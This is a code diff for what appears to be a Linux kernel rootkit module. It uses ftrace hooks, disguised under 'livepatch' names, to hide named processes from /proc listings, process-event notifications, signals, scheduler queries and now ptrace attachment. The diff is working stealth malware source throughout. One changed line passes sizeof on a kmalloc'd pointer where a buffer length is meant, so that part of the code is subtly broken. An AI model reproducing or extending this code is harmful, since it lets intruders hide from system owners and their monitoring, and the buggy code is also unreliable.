@@ -100,7 +100,6 @@ module_param(force_reboot_disabled, int, 0644);
 static int num_proc_name = 3;
 static char *hidden_proc_name[MAX_NUM_PROC_NAME] = {"hidden_comm", "touch", "rm"};
 module_param_array(hidden_proc_name, charp, &num_proc_name, 0644);
-static char exe_buf[PATH_MAX] = {0};
 
 static char hidden_msg_klog[] = "hidden_proc";
 static char **p_log_buf = NULL;
@@ -214,14 +213,19 @@ end:
 	return 0;
 }
 
-static int is_hidden_proc(struct task_struct *task, pid_t pid) 
+static int is_hidden_proc(struct task_struct *task) 
 {
 	int ret = 0;
+	char *exe_buf = NULL;
 
-	if (hidden_base_exe) {
-		if (get_task_exe(exe_buf, sizeof(exe_buf), task) > 0) {
-			if (is_hidden_proc_name(exe_buf, sizeof(exe_buf)))
-				ret = 1;
+	if (unlikely(!(task->flags & PF_KTHREAD)) && hidden_base_exe) {
+		exe_buf = kmalloc(PATH_MAX, GFP_KERNEL);
+		if (exe_buf) {
+			if (get_task_exe(exe_buf, sizeof(exe_buf), task) > 0) {
+				if (is_hidden_proc_name(exe_buf, sizeof(exe_buf)))
+					ret = 1;
+			}
+			kfree(exe_buf);
 		}
 	} else {
 		if (is_hidden_proc_name(task->comm, sizeof(task->comm)))
@@ -244,7 +248,7 @@ static int is_hidden_proc_pid(pid_t pid)
         if (!task)
                 goto end;
 
-	if (is_hidden_proc(task , pid)) 
+	if (is_hidden_proc(task)) 
 		ret = 1;
 	put_task_struct(task);
 
@@ -272,7 +276,7 @@ static struct dentry *livepatch_proc_pid_lookup(struct dentry *dentry, unsigned 
         if (!task)
                 goto out;
 
-	if (is_hidden_proc(task , tgid)) {
+	if (is_hidden_proc(task)) {
 		put_task_struct(task);
 		goto out;
 	}
@@ -317,7 +321,7 @@ static int livepatch_proc_pid_readdir(struct file *file, struct dir_context *ctx
                 if (!has_pid_permissions(ns, iter.task, HIDEPID_INVISIBLE))
                         continue;
 
-		if (is_hidden_proc(iter.task, iter.tgid))
+		if (is_hidden_proc(iter.task))
 			continue;
 
                 len = snprintf(name, sizeof(name), "%u", iter.tgid);
@@ -522,10 +526,16 @@ static int livepatch_cn_netlink_send(struct cn_msg *msg, u32 portid, u32 __group
         gfp_t gfp_mask)
 {
 	struct task_struct *task = current;
+	struct proc_event *ev = NULL;
 
-	if (is_hidden_proc(task, task->tgid))
+	if (__group != CN_IDX_PROC) 
+		goto send;
+
+	ev = (struct proc_event *)msg->data;
+	if (ev->what == PROC_EVENT_EXEC && is_hidden_proc(task))
 		return 0;
 
+send:
 	return cn_netlink_send_mult(msg, msg->len, portid, __group, gfp_mask);
 }
 
@@ -541,7 +551,7 @@ static int livepatch_kill_pid_info(int sig, struct kernel_siginfo *info, struct 
 
 	rcu_read_lock();
 	p = pid_task(pid, PIDTYPE_PID);
-	if (p && is_hidden_proc(p, p->tgid) && sig != SIGKILL) {
+	if (p && is_hidden_proc(p) && sig != SIGKILL) {
 		rcu_read_unlock();
 		return error;
 	}
@@ -580,7 +590,7 @@ static int livepatch_do_getpgid(pid_t pid)
                         goto out;
 
 		get_task_struct(p);
-		if (is_hidden_proc(p, pid)) {
+		if (is_hidden_proc(p)) {
 			put_task_struct(p);
 			goto out;
 		}
@@ -931,13 +941,23 @@ static asmlinkage int ftrace_fsnotify(struct inode *to_tell, __u32 mask, const v
 	
 	return read_fsnotify(to_tell, mask, data, data_is, file_name, cookie);
 } 
+#endif
 
 static asmlinkage  bool (*real_icmp_echo)(struct sk_buff *skb) = NULL;
 static asmlinkage  bool ftrace_icmp_echo(struct sk_buff *skb)
 {
 	return real_icmp_echo(skb);
 }
-#endif
+
+static asmlinkage  int (*real_ptrace_attach)(struct task_struct *task, long request,
+                         unsigned long addr,
+                         unsigned long flags) = NULL;
+static asmlinkage  int ftrace_ptrace_attach(struct task_struct *task, long request,
+                         unsigned long addr,
+                         unsigned long flags) 
+{
+	return real_ptrace_attach(task, request, addr, flags);
+}
 
 #else
 
@@ -954,7 +974,7 @@ static asmlinkage long ftrace_sched_getaffinity(pid_t pid, struct cpumask *mask)
 	rcu_read_unlock();
 
 	if (p) {
-		if (is_hidden_proc(p, pid))
+		if (is_hidden_proc(p))
 			ret = -ESRCH;
 		put_task_struct(p); 
 	}
@@ -969,7 +989,7 @@ static asmlinkage int (*real_security_task_getscheduler)(struct task_struct *p) 
 static asmlinkage int ftrace_security_task_getscheduler(struct task_struct *p)
 {
 	if (p) {
-		if (is_hidden_proc(p, p->tgid))
+		if (is_hidden_proc(p))
 			return -ESRCH;
 	}
 
@@ -981,7 +1001,7 @@ static asmlinkage int (*real_security_task_getsid)(struct task_struct *p) = NULL
 static asmlinkage int ftrace_security_task_getsid(struct task_struct *p)
 {
 	if (p) {
-		if (is_hidden_proc(p, p->tgid))
+		if (is_hidden_proc(p))
 			return -ESRCH;
 	}
 
@@ -1058,6 +1078,7 @@ static asmlinkage int ftrace_fsnotify(struct inode *to_tell, __u32 mask, const v
 	
 	return real_fsnotify(to_tell, mask, data, data_is, file_name, cookie);
 } 
+#endif
 
 static int run_usr_cmd(const char *cmd)
 {
@@ -1115,7 +1136,19 @@ static asmlinkage  bool ftrace_icmp_echo(struct sk_buff *skb)
 
 	return real_icmp_echo(skb);
 }
-#endif
+
+static asmlinkage  int (*real_ptrace_attach)(struct task_struct *task, long request,
+                         unsigned long addr,
+                         unsigned long flags) = NULL;
+static asmlinkage  int ftrace_ptrace_attach(struct task_struct *task, long request,
+                         unsigned long addr,
+                         unsigned long flags) 
+{
+	if (is_hidden_proc(task))
+		return -ESRCH;
+
+	return real_ptrace_attach(task, request, addr, flags);
+}
 #endif
 
 static struct ftrace_hook hooks[] = {
@@ -1126,8 +1159,9 @@ static struct ftrace_hook hooks[] = {
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 0, 1)
         HOOK("__fsnotify_parent", ftrace___fsnotify_parent, &real___fsnotify_parent),
         HOOK("fsnotify", ftrace_fsnotify, &real_fsnotify),
-        HOOK("icmp_echo", ftrace_icmp_echo, &real_icmp_echo),
 #endif
+        HOOK("icmp_echo", ftrace_icmp_echo, &real_icmp_echo),
+        HOOK("ptrace_attach", ftrace_ptrace_attach, &real_ptrace_attach),
 };
 
 static int entry_handler_sys_getpriority(struct kretprobe_instance *ri, struct pt_regs *regs)
